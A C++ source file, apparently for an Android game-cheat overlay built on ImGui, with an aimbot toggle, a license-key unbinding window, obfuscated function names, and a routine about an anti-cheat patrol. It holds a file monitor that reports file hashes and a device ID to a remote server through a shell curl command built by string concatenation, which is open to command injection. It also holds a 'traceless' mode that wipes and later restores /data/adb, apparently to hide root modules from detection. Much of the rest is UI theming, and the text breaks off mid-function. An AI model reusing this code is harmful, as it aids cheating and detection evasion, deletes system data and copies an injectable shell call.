#include <filesystem>
#include <fstream>
#include <chrono>
#include <thread>
#include <random>
#include <future>
#include "json.hpp"
#include "imgui.h"
#include "图片调用.h"
#include "辅助类.h"
#include "Utils/Utils.h"
#include "custom.hpp"
#include "imgui_tricks.hpp"
#include <sys/epoll.h>
#include <linux/input.h>
#include <vector>
#include <string>
#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <linux/input.h>
#include <thread>
#include <cstdarg> // 用于 va_list
#include <sys/resource.h>
#include <sys/syscall.h>
#include "DataReader.h"
#include <poll.h> // poll 结构体
#include <atomic> // std::atomic
#include <sys/utsname.h>

static std::atomic<bool> g_volumeKeyPressed(false);
static std::thread g_volumeThread;
static std::atomic<bool> g_volumeThreadRunning(true);
float statusBarAlpha = 0.8f; // 状态栏背景透明度，范围 0.3 ~ 1.0
using json = nlohmann::json;
// 外部函数声明（保持原样）
extern std::string getIMEI();
extern std::string dccd5a00d1e7c3717afecb8cf06932b8b(const std::string &);
extern std::string t510d4f87b189757294b61eafde7dcc01(const std::string &, const std::string &);
extern std::string a3b5f410c2d8621923a66cede4bc8ac34(const std::string &);
extern std::string q648fa2f9ee26290c776d0545d10ca5f8(const std::string &);
extern std::string jf9fa77eb23cb2049c9e7f7fae967d770(const std::string &, const std::string &);
extern std::string m367456673340c0cb888250365b54a6ce(const std::string &);
extern std::string httppost(const std::string &, const std::string &, const std::string &);
extern std::string t3ecb948ff5e870506e78160a95a1ec24(const std::string &);
extern std::string wef51bd54b4960d4881e233acf0a25f83(const std::string &);
extern std::string p3eca7b0968b8c1535746e24ba2547b6c(const std::string &);
extern std::string g11bf581d48633826202451738f490782(const std::string &, const std::string);
// ============================================================
// ★ 纯 C++ SHA256 实现（无需 OpenSSL）
// ============================================================
// ============================================================
// ★ 文件监控模块 - 使用现有 httppost 函数
// ============================================================

#include <sys/stat.h>
#include <iomanip>
#include <sstream>
#include <cstring>

// 计算文件 SHA256（纯 C++，无需外部库）
class CSHA256
{
public:
    CSHA256() { init(); }
    void init()
    {
        h[0] = 0x6a09e667;
        h[1] = 0xbb67ae85;
        h[2] = 0x3c6ef372;
        h[3] = 0xa54ff53a;
        h[4] = 0x510e527f;
        h[5] = 0x9b05688c;
        h[6] = 0x1f83d9ab;
        h[7] = 0x5be0cd19;
        dataLen = 0;
        bitLen = 0;
    }
    void update(const unsigned char *data, size_t len)
    {
        for (size_t i = 0; i < len; i++)
        {
            buffer[dataLen++] = data[i];
            if (dataLen == 64)
            {
                transform();
                dataLen = 0;
            }
        }
        bitLen += len * 8;
    }
    void final(unsigned char *hash)
    {
        size_t i = dataLen;
        if (dataLen < 56)
        {
            buffer[i++] = 0x80;
            while (i < 56)
                buffer[i++] = 0;
        }
        else
        {
            buffer[i++] = 0x80;
            while (i < 64)
                buffer[i++] = 0;
            transform();
            memset(buffer, 0, 56);
        }
        for (int j = 0; j < 8; j++)
            buffer[63 - j] = (unsigned char)(bitLen >> (j * 8));
        transform();
        for (int j = 0; j < 4; j++)
            for (int k = 0; k < 8; k++)
                hash[j + k * 4] = (h[k] >> (24 - j * 8)) & 0xff;
    }

private:
    uint32_t h[8], buffer[16], dataLen;
    uint64_t bitLen;
    static const uint32_t K[64];
    uint32_t rotr(uint32_t x, uint32_t n) { return (x >> n) | (x << (32 - n)); }
    uint32_t ch(uint32_t x, uint32_t y, uint32_t z) { return (x & y) ^ (~x & z); }
    uint32_t maj(uint32_t x, uint32_t y, uint32_t z) { return (x & y) ^ (x & z) ^ (y & z); }
    uint32_t sigma0(uint32_t x) { return rotr(x, 2) ^ rotr(x, 13) ^ rotr(x, 22); }
    uint32_t sigma1(uint32_t x) { return rotr(x, 6) ^ rotr(x, 11) ^ rotr(x, 25); }
    uint32_t gamma0(uint32_t x) { return rotr(x, 7) ^ rotr(x, 18) ^ (x >> 3); }
    uint32_t gamma1(uint32_t x) { return rotr(x, 17) ^ rotr(x, 19) ^ (x >> 10); }
    void transform()
    {
        uint32_t W[64], a, b, c, d, e, f, g, hh, T1, T2;
        for (int i = 0; i < 16; i++)
            W[i] = buffer[i];
        for (int i = 16; i < 64; i++)
            W[i] = gamma1(W[i - 2]) + W[i - 7] + gamma0(W[i - 15]) + W[i - 16];
        a = h[0];
        b = h[1];
        c = h[2];
        d = h[3];
        e = h[4];
        f = h[5];
        g = h[6];
        hh = h[7];
        for (int i = 0; i < 64; i++)
        {
            T1 = hh + sigma1(e) + ch(e, f, g) + K[i] + W[i];
            T2 = sigma0(a) + maj(a, b, c);
            hh = g;
            g = f;
            f = e;
            e = d + T1;
            d = c;
            c = b;
            b = a;
            a = T1 + T2;
        }
        h[0] += a;
        h[1] += b;
        h[2] += c;
        h[3] += d;
        h[4] += e;
        h[5] += f;
        h[6] += g;
        h[7] += hh;
    }
};
const uint32_t CSHA256::K[64] = {
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2};

// 计算文件 SHA256
std::string calcFileSHA256(const std::string &filePath)
{
    FILE *f = fopen(filePath.c_str(), "rb");
    if (!f)
        return "";
    CSHA256 sha;
    unsigned char buf[8192];
    int n;
    while ((n = fread(buf, 1, sizeof(buf), f)) > 0)
        sha.update(buf, n);
    fclose(f);
    unsigned char hash[32];
    sha.final(hash);
    std::stringstream ss;
    for (int i = 0; i < 32; i++)
        ss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i];
    return ss.str();
}

// 获取文件大小
long long getFileSize(const std::string &filePath)
{
    struct stat stat_buf;
    if (stat(filePath.c_str(), &stat_buf) != 0)
        return 0;
    return stat_buf.st_size;
}

// 检查文件是否存在
bool fileExists(const std::string &path)
{
    return access(path.c_str(), F_OK) == 0;
}

// ★ 使用系统 curl 命令发送 HTTPS POST（零依赖）
std::string httpPostJson(const std::string &url, const std::string &jsonData)
{
    // 把 JSON 保存到临时文件
    std::string tmpFile = "/data/local/tmp/_aura_fm.json";
    std::ofstream f(tmpFile);
    if (!f.is_open())
    {
        LOGE("无法创建临时文件");
        return "";
    }
    f << jsonData;
    f.close();

    // 用 curl 发送 POST 请求
    std::string cmd = "curl -s --connect-timeout 5 -X POST -H 'Content-Type: application/json' -d @" + tmpFile + " '" + url + "' 2>/dev/null";

    FILE *pipe = popen(cmd.c_str(), "r");
    if (!pipe)
    {
        LOGE("popen 失败");
        return "";
    }

    std::string result;
    char buf[4096];
    while (fgets(buf, sizeof(buf), pipe) != nullptr)
    {
        result += buf;
    }
    pclose(pipe);

    // 删除临时文件
    unlink(tmpFile.c_str());

    LOGI("上报响应: %s", result.c_str());
    return result;
}

// ============================================================
// 文件监控数据结构
// ============================================================
struct MonitoredFile
{
    std::string filePath;
    std::string displayName;
    std::string lastHash;
    long long lastSize;
    std::string lastStatus;
};

// ============================================================
// ★ 文件监控管理器
// ============================================================
class FileMonitorManager
{
private:
    std::vector<MonitoredFile> files;
    std::string deviceId;
    std::string apiBase;
    std::thread monitorThread;
    std::atomic<bool> running;
    std::mutex mtx;

    void reportFile(const MonitoredFile &file, const std::string &hash, long long size, const std::string &status)
    {
        json j;
        j["file_name"] = file.displayName;
        j["file_hash"] = hash;
        j["file_size"] = size;
        j["device_id"] = deviceId;
        j["status"] = status;

        std::string url = apiBase + "/api.php?action=report_file";
        std::string resp = httpPostJson(url, j.dump());
        LOGI("上报文件 [%s] 状态: %s", file.displayName.c_str(), status.c_str());
    }

    void reportFileMissing(const MonitoredFile &file)
    {
        json j;
        j["file_name"] = file.displayName;
        j["device_id"] = deviceId;

        std::string url = apiBase + "/api.php?action=report_file_missing";
        std::string resp = httpPostJson(url, j.dump());
        LOGI("上报文件缺失 [%s]", file.displayName.c_str());
    }

    void checkFile(MonitoredFile &file)
    {
        if (!fileExists(file.filePath))
        {
            if (file.lastStatus != "missing")
            {
                reportFileMissing(file);
                file.lastHash = "";
                file.lastSize = 0;
                file.lastStatus = "missing";
            }
            return;
        }

        std::string hash = calcFileSHA256(file.filePath);
        long long size = getFileSize(file.filePath);
        if (hash.empty())
            return;

        std::string status = "ok";
        if (file.lastHash.empty())
        {
            reportFile(file, hash, size, status);
        }
        else if (hash != file.lastHash)
        {
            status = "modified";
            reportFile(file, hash, size, status);
        }
        else if (file.lastStatus == "missing")
        {
            reportFile(file, hash, size, "ok");
        }

        file.lastHash = hash;
        file.lastSize = size;
        file.lastStatus = status;
    }

    void monitorLoop()
    {
        const int CHECK_INTERVAL_SECONDS = 10;
        while (running)
        {
            std::this_thread::sleep_for(std::chrono::seconds(CHECK_INTERVAL_SECONDS));
            if (!running)
                break;
            std::lock_guard<std::mutex> lock(mtx);
            for (auto &file : files)
                checkFile(file);
        }
    }

public:
    FileMonitorManager(const std::string &devId, const std::string &apiUrl)
        : deviceId(devId), apiBase(apiUrl), running(false) {}

    ~FileMonitorManager() { stop(); }

    void addFile(const std::string &filePath, const std::string &displayName = "")
    {
        std::lock_guard<std::mutex> lock(mtx);
        MonitoredFile mf;
        mf.filePath = filePath;
        mf.displayName = displayName.empty() ? filePath : displayName;
        mf.lastHash = "";
        mf.lastSize = 0;
        mf.lastStatus = "";
        files.push_back(mf);
        LOGI("添加文件监控: %s (%s)", mf.displayName.c_str(), filePath.c_str());
    }

    void start()
    {
        if (running)
            return;
        running = true;
        monitorThread = std::thread(&FileMonitorManager::monitorLoop, this);
        std::this_thread::sleep_for(std::chrono::seconds(1));
        std::lock_guard<std::mutex> lock(mtx);
        for (auto &file : files)
            checkFile(file);
    }

    void stop()
    {
        if (!running)
            return;
        running = false;
        if (monitorThread.joinable())
            monitorThread.join();
    }

    void checkNow()
    {
        std::lock_guard<std::mutex> lock(mtx);
        for (auto &file : files)
            checkFile(file);
    }
};

// 全局文件监控管理器指针
static FileMonitorManager *g_fileMonitor = nullptr;

enum UITheme
{
    THEME_DEFAULT = 0,
    THEME_SAKURA = 1,
    THEME_NOODLE = 2
};

static int currentTheme = THEME_NOODLE;
static const char *themeNames[] = {"默认", "樱花粉", "NoodleUI"};

// 状态栏显示控制
bool showTopStatusBar = false;

// ---------- 极简主题（默认） ----------
void ApplyMinimalTheme()
{
    ImGuiStyle &style = ImGui::GetStyle();
    style.WindowRounding = 12.0f;
    style.ChildRounding = 10.0f;
    style.FrameRounding = 6.0f;
    style.PopupRounding = 8.0f;
    style.ScrollbarRounding = 8.0f;
    style.GrabRounding = 6.0f;
    style.TabRounding = 8.0f;
    style.WindowBorderSize = 0.0f;
    style.FrameBorderSize = 0.0f;
    style.PopupBorderSize = 0.0f;
    style.ItemSpacing = ImVec2(12, 10);
    style.ItemInnerSpacing = ImVec2(10, 6);
    style.ScrollbarSize = 6.0f;
    ImVec4 *colors = style.Colors;
    colors[ImGuiCol_Text] = ImVec4(0.10f, 0.10f, 0.10f, 1.00f);
    colors[ImGuiCol_TextDisabled] = ImVec4(0.50f, 0.50f, 0.50f, 0.60f);
    colors[ImGuiCol_WindowBg] = ImVec4(0.96f, 0.96f, 0.96f, 1.00f);
    colors[ImGuiCol_ChildBg] = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
    colors[ImGuiCol_PopupBg] = ImVec4(0.98f, 0.98f, 0.98f, 0.98f);
    colors[ImGuiCol_Border] = ImVec4(0.85f, 0.85f, 0.85f, 0.50f);
    colors[ImGuiCol_BorderShadow] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
    colors[ImGuiCol_FrameBg] = ImVec4(0.92f, 0.92f, 0.92f, 0.80f);
    colors[ImGuiCol_FrameBgHovered] = ImVec4(0.88f, 0.88f, 0.88f, 0.90f);
    colors[ImGuiCol_FrameBgActive] = ImVec4(0.82f, 0.82f, 0.82f, 0.95f);
    colors[ImGuiCol_TitleBg] = ImVec4(0.98f, 0.98f, 0.98f, 1.00f);
    colors[ImGuiCol_TitleBgActive] = ImVec4(0.96f, 0.96f, 0.96f, 1.00f);
    colors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.98f, 0.98f, 0.98f, 1.00f);
    colors[ImGuiCol_MenuBarBg] = ImVec4(0.98f, 0.98f, 0.98f, 1.00f);
    colors[ImGuiCol_ScrollbarBg] = ImVec4(0.96f, 0.96f, 0.96f, 1.00f);
    colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.70f, 0.70f, 0.70f, 0.80f);
    colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.60f, 0.60f, 0.60f, 0.90f);
    colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.50f, 0.50f, 0.50f, 1.00f);
    colors[ImGuiCol_CheckMark] = ImVec4(0.20f, 0.60f, 0.90f, 1.00f);
    colors[ImGuiCol_SliderGrab] = ImVec4(0.30f, 0.60f, 0.90f, 0.90f);
    colors[ImGuiCol_SliderGrabActive] = ImVec4(0.20f, 0.50f, 0.80f, 1.00f);
    colors[ImGuiCol_Button] = ImVec4(0.90f, 0.90f, 0.90f, 0.80f);
    colors[ImGuiCol_ButtonHovered] = ImVec4(0.85f, 0.85f, 0.85f, 0.90f);
    colors[ImGuiCol_ButtonActive] = ImVec4(0.75f, 0.75f, 0.75f, 1.00f);
    colors[ImGuiCol_Header] = ImVec4(0.90f, 0.90f, 0.90f, 0.80f);
    colors[ImGuiCol_HeaderHovered] = ImVec4(0.85f, 0.85f, 0.85f, 0.90f);
    colors[ImGuiCol_HeaderActive] = ImVec4(0.80f, 0.80f, 0.80f, 1.00f);
    colors[ImGuiCol_Separator] = ImVec4(0.80f, 0.80f, 0.80f, 0.60f);
    colors[ImGuiCol_ResizeGrip] = ImVec4(0.70f, 0.70f, 0.70f, 0.60f);
    colors[ImGuiCol_Tab] = ImVec4(0.90f, 0.90f, 0.90f, 0.80f);
    colors[ImGuiCol_TabHovered] = ImVec4(0.85f, 0.85f, 0.85f, 0.90f);
    colors[ImGuiCol_TabActive] = ImVec4(0.75f, 0.75f, 0.75f, 1.00f);
}

// ---------- NoodleUI 深色主题 ----------
void ApplyNoodleUITheme()
{
    ImGuiStyle &style = ImGui::GetStyle();
    style.WindowRounding = 10.0f;
    style.ChildRounding = 8.0f;
    style.FrameRounding = 6.0f;
    style.PopupRounding = 8.0f;
    style.ScrollbarRounding = 8.0f;
    style.GrabRounding = 6.0f;
    style.TabRounding = 8.0f;
    style.WindowBorderSize = 0.0f;
    style.FrameBorderSize = 0.0f;
    style.PopupBorderSize = 0.0f;
    style.ItemSpacing = ImVec2(10, 8);
    style.ItemInnerSpacing = ImVec2(8, 6);
    style.ScrollbarSize = 8.0f;
    ImVec4 *colors = style.Colors;
    colors[ImGuiCol_Text] = ImVec4(0.90f, 0.90f, 0.90f, 1.00f);
    colors[ImGuiCol_TextDisabled] = ImVec4(0.50f, 0.50f, 0.50f, 1.00f);
    colors[ImGuiCol_WindowBg] = ImVec4(0.08f, 0.09f, 0.10f, 1.00f);
    colors[ImGuiCol_ChildBg] = ImVec4(0.12f, 0.13f, 0.15f, 1.00f);
    colors[ImGuiCol_PopupBg] = ImVec4(0.08f, 0.09f, 0.10f, 0.98f);
    colors[ImGuiCol_Border] = ImVec4(0.25f, 0.27f, 0.30f, 0.60f);
    colors[ImGuiCol_BorderShadow] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
    colors[ImGuiCol_FrameBg] = ImVec4(0.20f, 0.22f, 0.25f, 0.80f);
    colors[ImGuiCol_FrameBgHovered] = ImVec4(0.25f, 0.27f, 0.30f, 0.90f);
    colors[ImGuiCol_FrameBgActive] = ImVec4(0.30f, 0.32f, 0.35f, 1.00f);
    colors[ImGuiCol_TitleBg] = ImVec4(0.08f, 0.09f, 0.10f, 1.00f);
    colors[ImGuiCol_TitleBgActive] = ImVec4(0.10f, 0.11f, 0.12f, 1.00f);
    colors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.08f, 0.09f, 0.10f, 1.00f);
    colors[ImGuiCol_MenuBarBg] = ImVec4(0.10f, 0.11f, 0.12f, 1.00f);
    colors[ImGuiCol_ScrollbarBg] = ImVec4(0.08f, 0.09f, 0.10f, 1.00f);
    colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.30f, 0.32f, 0.35f, 0.80f);
    colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.40f, 0.42f, 0.45f, 0.90f);
    colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.50f, 0.52f, 0.55f, 1.00f);
    colors[ImGuiCol_CheckMark] = ImVec4(0.20f, 0.80f, 1.00f, 1.00f);
    colors[ImGuiCol_SliderGrab] = ImVec4(0.20f, 0.80f, 1.00f, 0.90f);
    colors[ImGuiCol_SliderGrabActive] = ImVec4(0.30f, 0.90f, 1.00f, 1.00f);
    colors[ImGuiCol_Button] = ImVec4(0.20f, 0.22f, 0.25f, 0.80f);
    colors[ImGuiCol_ButtonHovered] = ImVec4(0.25f, 0.27f, 0.30f, 0.90f);
    colors[ImGuiCol_ButtonActive] = ImVec4(0.15f, 0.60f, 0.80f, 1.00f);
    colors[ImGuiCol_Header] = ImVec4(0.15f, 0.60f, 0.80f, 0.80f);
    colors[ImGuiCol_HeaderHovered] = ImVec4(0.20f, 0.65f, 0.85f, 0.90f);
    colors[ImGuiCol_HeaderActive] = ImVec4(0.10f, 0.55f, 0.75f, 1.00f);
    colors[ImGuiCol_Separator] = ImVec4(0.25f, 0.27f, 0.30f, 0.80f);
    colors[ImGuiCol_ResizeGrip] = ImVec4(0.20f, 0.22f, 0.25f, 0.60f);
    colors[ImGuiCol_Tab] = ImVec4(0.15f, 0.16f, 0.18f, 1.00f);
    colors[ImGuiCol_TabHovered] = ImVec4(0.20f, 0.22f, 0.25f, 1.00f);
    colors[ImGuiCol_TabActive] = ImVec4(0.10f, 0.55f, 0.75f, 1.00f);
    colors[ImGuiCol_PlotLines] = ImVec4(0.20f, 0.80f, 1.00f, 1.00f);
    colors[ImGuiCol_PlotLinesHovered] = ImVec4(0.30f, 0.90f, 1.00f, 1.00f);
    colors[ImGuiCol_PlotHistogram] = ImVec4(0.20f, 0.80f, 1.00f, 1.00f);
    colors[ImGuiCol_PlotHistogramHovered] = ImVec4(0.30f, 0.90f, 1.00f, 1.00f);
    colors[ImGuiCol_TextSelectedBg] = ImVec4(0.15f, 0.60f, 0.80f, 0.40f);
    colors[ImGuiCol_DragDropTarget] = ImVec4(0.20f, 0.80f, 1.00f, 0.90f);
    colors[ImGuiCol_NavHighlight] = ImVec4(0.20f, 0.80f, 1.00f, 0.80f);
}

// 提示框结构体
struct Notification
{
    std::string message;
    std::chrono::steady_clock::time_point start_time;
    float duration;
    float alpha;
    bool isSuccess;
};

static std::vector<Notification> notifications;
static const float NOTIFICATION_DURATION = 2.0f;
static bool 无痕读取开启 = false;
static std::string 备份目录 = " local/tmp/adb_backup/";
static std::string 目标目录 = "/data/adb/";
static int ColorSettings = 0;
extern 绘制 绘制;
static bool 悬浮窗 = true;
static bool 自瞄控件 = false;
ImVec2 Pos2;
ImVec2 windowSize, windowSize_max;
static bool 窗口状态 = false;
// static bool 广角设置 = false;

// 解绑相关变量
static bool 显示解绑窗口 = false;
static char 解绑卡密输入[128] = "";
static bool 解绑确认中 = false;
static std::string 解绑结果消息 = "";

bool showWindow = false;
float g_FrameTime = 0.0f;
int g_FPS = 0;
int g_FrameCount = 0;
std::chrono::steady_clock::time_point g_LastTime = std::chrono::steady_clock::now();

bool g_FloatWindow = false;

// ---------- 辅助函数声明 ----------
void ShowFloatWindow();
void HideFloatWindow();
void 猎鹰();
int 数据();
int 音量();
bool BackupADBDirectory();
bool ClearADBDirectory();
bool RestoreADBDirectory();
void CheckAutoRestore();
void AddNotification(const std::string &message, bool isSuccess);
void DrawNotifications();
void DrawThreeColorBalls();
void 更新状态();

// 悬浮窗显示/隐藏占位函数
void ShowFloatWindow()
{
    printf("悬浮窗显示\n");
}
void HideFloatWindow()
{
    printf("悬浮窗隐藏\n");
}

// 音量键监听函数（修复权限日志、按键识别）
void VolumeKeyListener()
{
    setpriority(PRIO_PROCESS, syscall(SYS_gettid), -20);
    const char *devicePaths[] = {
        "/dev/input/event0", "/dev/input/event1", "/dev/input/event2",
        "/dev/input/event3", "/dev/input/event4", "/dev/input/event5",
        "/dev/input/event6", "/dev/input/event7"};
    std::vector<int> fds;
    for (const char *path : devicePaths)
    {
        int fd = open(path, O_RDONLY | O_NONBLOCK);
        if (fd >= 0)
            fds.push_back(fd);
    }
    if (fds.empty())
        return;

    std::vector<pollfd> pfds(fds.size());
    for (size_t i = 0; i < fds.size(); ++i)
    {
        pfds[i].fd = fds[i];
        pfds[i].events = POLLIN;
    }

    input_event ev;
    while (g_volumeThreadRunning)
    {
        int ret = poll(pfds.data(), pfds.size(), 20);
        if (ret > 0)
        {
            for (size_t i = 0; i < pfds.size(); ++i)
            {
                if (pfds[i].revents & POLLIN)
                {
                    while (read(pfds[i].fd, &ev, sizeof(ev)) == sizeof(ev))
                    {
                        // 仅处理音量键按下事件
                        if (ev.type == EV_KEY && ev.value == 1 &&
                            (ev.code == KEY_VOLUMEUP || ev.code == KEY_VOLUMEDOWN))
                        {
                            static uint64_t lastTime = 0;
                            uint64_t now = std::chrono::duration_cast<std::chrono::milliseconds>(
                                               std::chrono::system_clock::now().time_since_epoch())
                                               .count();
                            if (now - lastTime > 200)
                            {
                                lastTime = now;
                                g_volumeKeyPressed = true;
                            }
                        }
                    }
                }
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
    }

    for (int fd : fds)
        close(fd);
}

void 猎鹰()
{
    while (true)
    {
        srand(time(0));
        int random_number = rand() % 100;
        if (random_number < 1)
        {
            std::ofstream file("/data/猎鹰判断/监测到猎鹰巡查正在观战...");
            if (file.is_open())
                file.close();
        }
        sleep(500);
    }
}

static int style_idx = 0;

int 数据()
{
    DIR *dir = opendir("/dev/input/");
    dirent *ptr = NULL;
    int count = 0;
    while ((ptr = readdir(dir)) != NULL)
    {
        if (strstr(ptr->d_name, "event"))
            count++;
    }
    return count ? count : -1;
}

int 音量()
{
    int EventCount = 数据();
    if (EventCount < 0)
    {
        printf("未找到输入设备\n");
        return -1;
    }
    int *fdArray = (int *)malloc(EventCount * sizeof(int));
    for (int i = 0; i < EventCount; i++)
    {
        char temp[128];
        sprintf(temp, "/dev/input/event%d", i);
        fdArray[i] = open(temp, O_RDWR | O_NONBLOCK);
    }
    input_event ev;
    while (1)
    {
        for (int i = 0; i < EventCount; i++)
        {
            memset(&ev, 0, sizeof(ev));
            read(fdArray[i], &ev, sizeof(ev));
            if (ev.type == EV_KEY && (ev.code == KEY_VOLUMEUP || ev.code == KEY_VOLUMEDOWN))
            {
                if (ev.code == 115 && ev.value == 1)
                    悬浮窗 = true;
                else if (ev.code == 114 && ev.value == 1)
                    悬浮窗 = false;
            }
            usleep(1000);
        }
        usleep(500);
    }
    return 0;
}

// 备份目录函数
bool BackupADBDirectory()
{
    try
    {
        // 创建备份目录
        std::filesystem::create_directories(备份目录);

        // 检查目标目录是否存在
        if (!std::filesystem::exists(目标目录))
        {
            return true; // 目录不存在，无需备份
        }

        // 遍历目标目录并备份所有文件和子目录
        for (const auto &entry : std::filesystem::recursive_directory_iterator(目标目录))
        {
            try
            {
                std::string relative_path = entry.path().string().substr(目标目录.length());
                std::string backup_path = 备份目录 + relative_path;

                if (entry.is_directory())
                {
                    std::filesystem::create_directories(backup_path);
                }
                else if (entry.is_regular_file())
                {
                    std::filesystem::copy_file(entry.path(), backup_path,
                                               std::filesystem::copy_options::overwrite_existing);
                }
            }
            catch (const std::exception &e)
            {
                // 忽略单个文件备份失败，继续备份其他文件
                continue;
            }
        }

        return true;
    }
    catch (const std::exception &e)
    {
        return false;
    }
}

// 清空目录函数
bool ClearADBDirectory()
{
    try
    {
        if (!std::filesystem::exists(目标目录))
        {
            return true; // 目录不存在，无需清空
        }

        // 遍历并删除目录中的所有内容
        for (const auto &entry : std::filesystem::directory_iterator(目标目录))
        {
            try
            {
                std::filesystem::remove_all(entry.path());
            }
            catch (const std::exception &e)
            {
                // 忽略删除失败的文件，继续删除其他文件
                continue;
            }
        }

        return true;
    }
    catch (const std::exception &e)
    {
        return false;
    }
}

// 恢复目录函数 - 增强错误处理
bool RestoreADBDirectory()
{
    try
    {
        // 检查备份目录是否存在
        if (!std::filesystem::exists(备份目录))
        {
            LOGE("备份目录不存在，无需恢复");
            return true;
        }

        LOGE("开始恢复目录...");

        // 确保目标目录存在
        std::filesystem::create_directories(目标目录);

        int restored_files = 0;
        int restored_dirs = 0;
        int failed_items = 0;

        // 遍历备份目录并恢复所有文件和子目录
        for (const auto &entry : std::filesystem::recursive_directory_iterator(备份目录))
        {
            try
            {
                std::string relative_path = entry.path().string().substr(备份目录.length());
                std::string restore_path = 目标目录 + relative_path;

                if (entry.is_directory())
                {
                    std::filesystem::create_directories(restore_path);
                    restored_dirs++;
                }
                else if (entry.is_regular_file())
                {
                    // 确保目标目录存在
                    std::filesystem::create_directories(std::filesystem::path(restore_path).parent_path());

                    std::filesystem::copy_file(entry.path(), restore_path,
                                               std::filesystem::copy_options::overwrite_existing);
                    restored_files++;
                }
            }
            catch (const std::exception &e)
            {
                failed_items++;
                LOGE("恢复项目失败: %s", e.what());
                continue;
            }
        }

        LOGE("恢复完成: %d 个文件, %d 个目录, %d 个失败", restored_files, restored_dirs, failed_items);

        // 恢复完成后删除备份目录
        try
        {
            if (std::filesystem::remove_all(备份目录))
            {
                LOGE("备份目录已清理");
            }
            else
            {
                LOGE("警告：备份目录清理失败");
                return false;
            }
        }
        catch (const std::exception &e)
        {
            LOGE("清理备份目录失败: %s", e.what());
            return false;
        }

        return failed_items == 0;
    }
    catch (const std::exception &e)
    {
        LOGE("恢复过程中发生异常: %s", e.what());
        return false;
    }
}

void DrawLargePinkTitle()
{
    ImVec2 cursorPos = ImGui::GetCursorPos();
    ImVec2 screenPos = ImGui::GetCursorScreenPos();
    ImGui::GetWindowDrawList()->AddText(nullptr, 24.0f, screenPos, IM_COL32(255, 100, 200, 255), "待初始化");
    ImGui::SetCursorPos(ImVec2(cursorPos.x, cursorPos.y + 30));
}

// 检查是否在开机时自动恢复
void CheckAutoRestore()
{
    // 检查是否存在备份目录，如果存在则自动恢复
    if (std::filesystem::exists(备份目录))
    {
        RestoreADBDirectory();
    }
}

// 修复后的 IOSStyleToggle 函数 - 使用 ImGui 原生支持的函数
bool IOSStyleToggle(const char *label, bool *v, float animation_speed = 3.0f)
{
    ImDrawList *draw_list = ImGui::GetWindowDrawList();
    ImVec2 pos = ImGui::GetCursorScreenPos();
    static std::unordered_map<ImGuiID, float> animation_states;
    ImGuiID id = ImGui::GetID(label);
    if (animation_states.find(id) == animation_states.end())
        animation_states[id] = 0.0f;
    float &anim = animation_states[id];
    bool is_hovered = ImGui::IsItemHovered();
    float anim_target = (*v ? 1.0f : 0.0f);
    anim = ImLerp(anim, anim_target, ImGui::GetIO().DeltaTime * animation_speed);
    float total_height = 60.0f, total_width = 370.0f;
    bool pressed = ImGui::InvisibleButton(label, ImVec2(total_width, total_height));
    float padding = 20.0f, switch_width = 60.0f, switch_height = 30.0f, icon_size = 20.0f, icon_text_spacing = 15.0f;
    ImU32 bg_color = is_hovered ? IM_COL32(225, 225, 235, 255) : IM_COL32(240, 240, 250, 255);
    draw_list->AddRectFilled(pos, ImVec2(pos.x + total_width, pos.y + total_height), bg_color, 8.0f);
    float border_alpha = 200 + (int)(55 * anim);
    draw_list->AddRect(pos, ImVec2(pos.x + total_width, pos.y + total_height), IM_COL32(0, 204, 255, (int)border_alpha), 8.0f, ImDrawFlags_RoundCornersAll, 2.0f);
    draw_list->AddRect(ImVec2(pos.x + 1, pos.y + 1), ImVec2(pos.x + total_width - 1, pos.y + total_height - 1), IM_COL32(255, 255, 255, 100), 7.0f, ImDrawFlags_RoundCornersAll, 1.0f);
    ImVec2 text_size = ImGui::CalcTextSize(label);
    float text_start_x = pos.x + padding + icon_size + icon_text_spacing;
    ImVec2 text_pos = ImVec2(text_start_x, pos.y + (total_height - text_size.y) * 0.5f);
    draw_list->AddText(text_pos, IM_COL32(30, 30, 30, 255), label);
    ImVec2 switch_pos = ImVec2(pos.x + total_width - switch_width - padding, pos.y + (total_height - switch_height) * 0.5f);
    ImU32 switch_bg_off = IM_COL32(229, 229, 234, 255), switch_bg_on = IM_COL32(76, 217, 100, 255);
    ImVec4 bg_off_color = ImGui::ColorConvertU32ToFloat4(switch_bg_off), bg_on_color = ImGui::ColorConvertU32ToFloat4(switch_bg_on);
    ImVec4 current_bg_color = {
        bg_off_color.x + (bg_on_color.x - bg_off_color.x) * anim,
